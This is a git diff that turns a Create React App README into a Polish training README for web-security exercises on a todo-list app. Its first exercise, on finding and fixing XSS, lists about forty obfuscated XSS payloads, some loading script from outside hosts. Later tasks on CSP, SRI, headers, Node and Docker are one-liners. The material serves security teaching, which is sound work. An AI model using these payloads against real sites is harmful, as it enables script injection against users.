@@ -1,46 +1,112 @@
-# Getting Started with Create React App
+# Ćwiczenia z bezpieczeństwa aplikacji webowych
 
-This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
+Aplikacja todo list służy do dodawania, usuwanie zadań do zrobienia i zaznaczaniu jako zrobione, posiada również 
+funkcję priorytetyzacji zadań oraz dodawania zadań z linku url
 
-## Available Scripts
+## Ćwiczenie 1
 
-In the project directory, you can run:
+Znajdź podatności XSS w aplikacji i je wyeliminuuj
 
-### `npm start`
+przykładowe wektory ataku
 
-Runs the app in the development mode.\
-Open [http://localhost:3000](http://localhost:3000) to view it in the browser.
+<div style="color:rgb(''&#0;x:expression(alert(1))"></div> 
 
-The page will reload if you make edits.\
-You will also see any lint errors in the console.
+```
+<img/src=%00 id=confirm(1) onerror=eval(id)
 
-### `npm test`
+<div id=confirm(1) onmouseover=eval(id)>X</div> 
 
-Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
+<span/onmouseover=confirm(1)>X</span>
 
-### `npm run build`
+<svg/contentScriptType=text/vbs><script>Execute(MsgBox(chr(88)&chr(83)&chr(83)))
 
-Builds the app for production to the `build` folder.\
-It correctly bundles React in production mode and optimizes the build for the best performance.
+<iframe/src="javascript:a=[alert&lpar;1&rpar;,confirm&#40;2&#41;,prompt%283%29];eval(a[0]);">
 
-The build is minified and the filenames include the hashes.\
-Your app is ready to be deployed!
+<div/style=content:url(data:image/svg+xml);visibility:visible onmouseover=alert(1)>x</div>
 
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
+<script>Object.defineProperties(window,{w:{value:{f:function(){return 1}}}});confirm(w.f())</script>
 
-### `npm run eject`
+<keygen/onfocus=prompt(1);>
 
-**Note: this is a one-way operation. Once you `eject`, you can’t go back!**
+<img/src=`%00` id=confirm(1) onerror=eval(id)
 
-If you aren’t satisfied with the build tool and configuration choices, you can `eject` at any time. This command will remove the single build dependency from your project.
+<img/src=`%00` onerror=this.onerror=confirm(1)
 
-Instead, it will copy all the configuration files and the transitive dependencies (webpack, Babel, ESLint, etc) right into your project so you have full control over them. All of the commands except `eject` will still work, but they will point to the copied scripts so you can tweak them. At this point you’re on your own.
+<iframe/src="data:text/html,<iframe%09onload=confirm(1);>">
 
-You don’t have to ever use `eject`. The curated feature set is suitable for small and middle deployments, and you shouldn’t feel obligated to use this feature. However we understand that this tool wouldn’t be useful if you couldn’t customize it when you are ready for it.
+<math><a/xlink:href=javascript:prompt(1)>X
 
-## Learn More
+<input/type="image"/value=""`<span/onmouseover='confirm(1)'>X`</span>
 
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
+<form/action=javascript&#x0003A;eval(setTimeout(confirm(1)))><input/type=submit>
 
-To learn React, check out the [React documentation](https://reactjs.org/).
+<body/onload=this.onload=document.body.innerHTML=alert&lpar;1&rpar;>
+
+<iframe/onload='javascript&#58;void&#40;1&#41;&quest;void&#40;1&#41;&#58;confirm&#40;1&#41;'>
+
+<object/type="text/x-scriptlet"/data="data:X,&#60script&#62setInterval&lpar;'prompt(1)',10&rpar;&#60/script&#62"></object>
+
+<i<f<r<a<m<e><iframe/onload=confirm(1);></i>f>r>a>m>e>
+
+http://www.<script abc>setTimeout('confirm(1)',1)</script .com>
+
+<style/onload    =    !-alert&#x28;1&#x29;>
+
+<svg id=a /><script language=vbs for=a event=onload>alert 1</script>
+
+<object/data="data&colon;X&comma;&lt;script&gt;alert&#40;1&#41;%3c&sol;script%3e">
+
+<form/action=javascript&#x3A;void(1)&quest;void(1)&colon;alert(1)><input/type='submit'>
+
+<iframe/srcdoc='&lt;iframe&sol;onload&equals;confirm(&sol;&iexcl;&hearts;&xcup;&sol;)&gt;'>
+
+<meta/http-equiv="refresh"/content="0;url=javascript&Tab;:&Tab;void(alert(0))?0:0,0,prompt(0)">
+
+<script src="h&Tab;t&Tab;t&Tab;p&Tab;s&colon;/&Tab;/&Tab;http://dl.dropbox.com/u/13018058/js.js"></script>
+
+<style/onload='javascript&colon;void(0)?void(0)&colon;confirm(1)'>
+
+<svg><style>&#x7B;-o-link-source&#x3A;'<style/onload=confirm(1)>'&#x7D;
+
+<math><solve i.e., x=2+2*2-2/2=? href="data:text/html,<script>prompt(1)</script>">X
+
+<iframe/src="j&Tab;AVASCRIP&NewLine;t:\u0061ler\u0074&#x28;1&#x29;">
+
+<iframe/src="javascript:void(alert(1))?alert(1):confirm(1),prompt(1)">
+
+<embed/src=javascript&colon;\u0061&#x6C;&#101%72t&#x28;1&#x29;>
+
+<img/src='http://i.imgur.com/P8mL8.jpg ' onmouseover={confirm(1)}f()>
+
+<style/&Tab;/onload=;&Tab;this&Tab;.&Tab;onload=confirm(1)>
+
+<embed/src=//goo.gl/nlX0P>
+
+<form><button formaction=javascript:alert(1)>CLICKME 
+
+<script>x='con';s='firm';S='(1)';setTimeout(x+s+S,0);</script>
+
+<img/id="confirm&lpar;1&#x29;"/alt="/"src="/"onerror=eval(id&#x29;>
+
+<iframe/src="data&colon;text&sol;html,<s&Tab;cr&Tab;ip&Tab;t>confirm(1)</script>">
+```
+
+## Ćwiczenie 2
+
+Zabezpiecz aplikację pod kątem csp
+
+## Ćwiczenie 3
+
+zabezpiecz aplikację pod kątem SRI
+
+## Ćwiczenie 4
+
+dodaj secure http headers
+
+## Ćwiczenie 5
+
+zabezpiecz server node js
+
+## Ćwiczenie 6
+
+zabezpiecz dokera
